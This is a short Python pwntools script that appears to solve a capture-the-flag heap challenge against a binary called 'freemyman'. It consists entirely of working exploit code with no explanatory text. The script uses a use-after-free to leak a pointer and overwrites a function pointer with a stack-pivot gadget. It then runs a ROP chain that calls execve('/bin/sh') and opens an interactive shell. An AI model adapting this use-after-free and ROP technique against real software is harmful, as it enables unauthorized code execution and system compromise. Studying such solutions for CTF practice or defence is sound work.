#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./freemyman")

def add(title, content):
    shell.sendlineafter(b">> ", b"1")
    shell.sendlineafter(b"Title: ", title)
    shell.sendlineafter(b"Content: ", content)

def edit(index, title, content):
    shell.sendlineafter(b">> ", b"2")
    shell.sendlineafter(b": ", str(index).encode())
    shell.sendlineafter(b"Title: ", title)
    shell.sendlineafter(b"Content: ", content)

def show(index):
    shell.sendlineafter(b">> ", b"3")
    shell.sendlineafter(b"show: ", str(index).encode())

def delete(index):
    shell.sendlineafter(b">> ", b"4")
    shell.sendlineafter(b": ", str(index).encode())

def data(title, content):
    shell.sendlineafter(b">> ", b"5")
    shell.sendlineafter(b"Title: ", title)
    shell.sendlineafter(b"Content: ", content)

add(b"A" * 0x40, b"A" * 0x40)

delete(1)
show(1)

shell.recvuntil(b"Title: ")
leak = u64(shell.recv(6).ljust(8, b"\x00"))

edit(1, p64(leak), b"A" * 0x40)
data(b"B" * 0x40, b"B" * 0x46 + p64(0x45c0d8)) # xchg r10, rsp; ret;

payload  = b""
payload += b"A" * 30
payload += p64(0x483522) # pivot address
payload += p64(0x403e95) # pop rdi; pop r14; pop r13; pop r12; pop rbx; ret;
payload += p64(0x461fc1) # "/bin/sh"
payload += p64(0x0) * 4  # padding for pops
payload += p64(0x413c23) # pop rax; ret;
payload += p64(0x0)      # NULL
payload += p64(0x44f0f3) # mov rdx, rax; shr rdx, 0x3f; add rax, rdx; sar rax, 1; ret;
payload += p64(0x413c23) # pop rax; ret;
payload += p64(0x3b)     # execve()
payload += p64(0x401e6f) # mov rsi, rdx; syscall;

add(b"\x00" * 0x40, payload)
show(1)

shell.recvline()
shell.interactive()
